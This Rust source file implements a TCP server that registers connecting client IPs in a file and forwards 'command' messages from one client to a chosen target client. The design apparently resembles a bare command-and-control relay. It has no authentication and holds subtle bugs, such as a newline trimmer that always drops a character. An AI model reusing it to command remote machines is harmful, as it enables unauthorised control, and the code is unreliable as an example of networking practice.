#[macro_use]
extern crate lazy_static;

use std::thread;
use std::net::{TcpListener, TcpStream, Shutdown};
use std::io::{Read, Write, BufRead};
use std::fs::File;
use std::io::BufReader;
use std::fs::OpenOptions;
use std::collections::HashMap;
use std::sync::Mutex;
use std::str;
use std::panic::resume_unwind;
//static  mut ONLINE:HashMap<String,TcpStream>=HashMap::new();
lazy_static! {
    static ref HASHMAP: Mutex<HashMap<String,TcpStream>> = {
        let mut m = HashMap::new();
        Mutex::new(m)
    };
}

fn orders_manage(commands:Vec<&str>){
   let mut ONLINE =HASHMAP.lock().unwrap();
    if commands[0]=="command"{
        let comm =commands[1].replace("target", "");
        let target = commands[2];
        println!("{} {}",comm,target);
        for key in ONLINE.keys(){
            if key==target{
                let mut stream:TcpStream=ONLINE[key].try_clone().unwrap();
                stream.write(comm.as_bytes());
            }
        }
    }

}
fn trim_newline(s: &mut String) {
    s.pop();
    if s.ends_with('\n') {
        s.pop();
        if s.ends_with('\r') {
            s.pop();
        }
    }
}
fn to_clean_string(buffer: &mut [u8]) -> String {
    let mut vec_input = vec![];
    vec_input.extend_from_slice(&buffer);
    let mut input = String::from_utf8(vec_input).unwrap();
    input.retain(|c| c != '\0');
    input.retain(|c| c!='\r');
    trim_newline(&mut input);
    let tmp:&str=input.split("\n").collect::<Vec<&str>>()[0];
    return  tmp.to_string();
}

fn send_message(ip_adress:String, msg:&str){

}
fn register(stream: &str){
    println!("registering");
    let mut file = OpenOptions::new()
        .write(true)
        .append(true)
        .open("src/user.txt")
        .unwrap();
    writeln!(file,"{}",stream).expect("Unable to write file");
}

  fn handle_client(mut stream: TcpStream) {
    //let mut data = [0u8; 1024]; // using 50 byte buffer*
      let mut data: Vec<u8> = Vec::with_capacity(127);
      for _ in 0..128 { data.push(0); }
      //let mut data = Vec::with_capacity(50);
      while match stream.read(&mut data) {
        Ok(size) => {
            let mut tmp =str::from_utf8(&data).unwrap();
            let mut tmp=to_clean_string(&mut data);
            let orders:Vec<&str>=tmp.split(":").collect();
            println!("{:?}",orders);
            orders_manage(orders);
            true
        },
        Err(_) => {
            println!("An error occurred, terminating connection with {}", stream.peer_addr().unwrap());
            stream.shutdown(Shutdown::Both).unwrap();
            false
        }
    }{stream.flush();}

 }
fn main() {
    let listener = TcpListener::bind("0.0.0.0:3333").unwrap();
    // accept connections and process them, spawning a new thread for each one
    println!("Server listening on port 3333");
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => unsafe {
                println!("New connection: {}", stream.peer_addr().unwrap());
                let test:String=stream.peer_addr().unwrap().to_string();
                let client_ip:&str=test.split(":").collect::<Vec<&str>>()[0].clone();
                let file: File = File::open("src/user.txt").expect("error");
                let mut _buf_reader = BufReader::new(file);
                let mut contents = String::new();
                _buf_reader.read_to_string(&mut contents);
                let _vec = contents.split("\n").collect::<Vec<&str>>();
                let mut ok:bool=false;
                for ip in _vec.iter(){
                    let _ip:Vec<&str>=ip.split(":").collect();
                    if  client_ip==_ip[0]
                    {
                        ok=true;
                    }
                }
                if ok==false{register(client_ip.clone())};
                let mut ONLINE =HASHMAP.lock().unwrap();
                ONLINE.insert(client_ip.to_string(),stream.try_clone().expect(" Unable to clone stream"));
                thread::spawn(move|| {
                    handle_client(stream)
                });
            }
            Err(e) => {
                println!("Error: {}", e);
                /* connection failed */
            }
        }
    }
    // close the socket server
    drop(listener);
}